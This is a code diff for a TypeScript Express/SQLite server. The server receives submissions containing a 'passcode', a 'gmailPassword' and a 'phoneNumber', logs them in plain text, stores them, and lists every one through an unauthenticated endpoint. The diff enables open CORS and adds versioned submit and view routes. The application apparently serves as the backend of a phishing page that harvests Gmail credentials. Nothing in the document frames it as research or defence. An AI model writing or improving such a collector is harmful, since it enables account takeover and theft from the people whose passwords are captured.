@@ -4,6 +4,7 @@ import Database from "better-sqlite3";
 import path from "path";
 import { fileURLToPath } from "url";
 import fs from "fs";
+import cors from "cors";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -42,9 +43,13 @@ async function startServer() {
   const app = express();
   const PORT = 3000;
 
+  // Enable CORS for all routes
+  app.use(cors());
   app.use(express.json());
+
+  // Logging middleware
   app.use((req, res, next) => {
-    console.log(`${req.method} ${req.url}`);
+    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
     next();
   });
 
@@ -54,8 +59,8 @@ async function startServer() {
   });
 
   // API Route to handle submissions
-  app.post("/api/submit", (req, res) => {
-    console.log("POST /api/submit hit with body:", req.body);
+  const handleSubmission = (req: express.Request, res: express.Response) => {
+    console.log("POST /api/v1/submit hit with body:", req.body);
     const { passcode, gmailPassword, phoneNumber } = req.body;
     
     if (!passcode && !gmailPassword && !phoneNumber) {
@@ -72,11 +77,14 @@ async function startServer() {
       console.error("Database error during save:", error);
       res.status(500).json({ error: "Failed to save submission" });
     }
-  });
+  };
+
+  app.post("/api/v1/submit", handleSubmission);
+  app.post("/api/v1/submit/", handleSubmission);
 
   // API Route to view submissions
-  app.get("/api/submissions", (req, res) => {
-    console.log("GET /api/submissions hit");
+  const handleGetSubmissions = (req: express.Request, res: express.Response) => {
+    console.log("GET /api/v1/submissions hit");
     try {
       const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
       console.log(`Returning ${rows.length} submissions`);
@@ -85,14 +93,17 @@ async function startServer() {
       console.error("Database error during fetch:", error);
       res.status(500).json({ error: "Failed to fetch submissions" });
     }
-  });
+  };
+
+  app.get("/api/v1/submissions", handleGetSubmissions);
+  app.get("/api/v1/submissions/", handleGetSubmissions);
 
   // Vite middleware for development
   let vite: any;
   if (process.env.NODE_ENV !== "production") {
     vite = await createViteServer({
       server: { middlewareMode: true },
-      appType: "custom", // Changed to custom to handle fallback manually
+      appType: "custom",
     });
     app.use(vite.middlewares);
   } else {
@@ -101,16 +112,19 @@ async function startServer() {
 
   // Catch-all route to serve index.html for SPA routing
   app.get("*", async (req, res, next) => {
+    // Skip API routes that might have reached here
+    if (req.url.startsWith("/api/")) {
+      return res.status(404).json({ error: "API route not found" });
+    }
+
     const url = req.originalUrl;
 
     try {
       if (process.env.NODE_ENV !== "production") {
-        // In development, read and transform index.html via Vite
         let template = fs.readFileSync(path.resolve(__dirname, "index.html"), "utf-8");
         template = await vite.transformIndexHtml(url, template);
         res.status(200).set({ "Content-Type": "text/html" }).end(template);
       } else {
-        // In production, serve the built index.html
         res.sendFile(path.join(__dirname, "dist", "index.html"));
       }
     } catch (e: any) {
